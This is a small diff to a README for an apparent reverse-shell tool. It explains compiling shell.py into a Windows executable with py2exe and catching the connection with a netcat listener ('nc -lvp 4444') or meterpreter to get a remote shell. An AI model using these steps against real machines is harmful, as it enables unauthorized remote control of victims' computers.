@@ -17,5 +17,5 @@ pip install -r requirements.txt
 ### How to run
 edit shell.py and change IP(25th line) to your local or wan ip 
 then just compile to exe using ```python setup.py py2exe```.You can find your file in dist folder.
-Set up listener using netcat or meterpreter then just run .exe file and you'll get shell.
+Set up listener using netcat ```nc -lvp 4444``` or meterpreter then just run .exe file and you'll get shell.
 
